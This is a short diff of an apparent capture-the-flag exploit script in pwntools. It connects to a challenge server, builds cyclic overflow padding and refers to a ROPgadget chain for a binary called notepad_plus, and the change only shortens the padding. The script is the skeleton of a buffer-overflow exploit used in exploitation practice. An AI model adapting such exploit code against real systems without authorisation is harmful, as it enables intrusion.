@@ -1,13 +1,13 @@
 from pwn import *
 from struct import pack
 
-print(cyclic(1000))
+print(cyclic(100))
 
 ip = 'ctf.adl.tw'
 port = 11004
 r = remote(ip, port)
 
-p = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaab"
+p = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaa"
 
 # ROPgadget --ropchain --binary notepad_plus > log
 
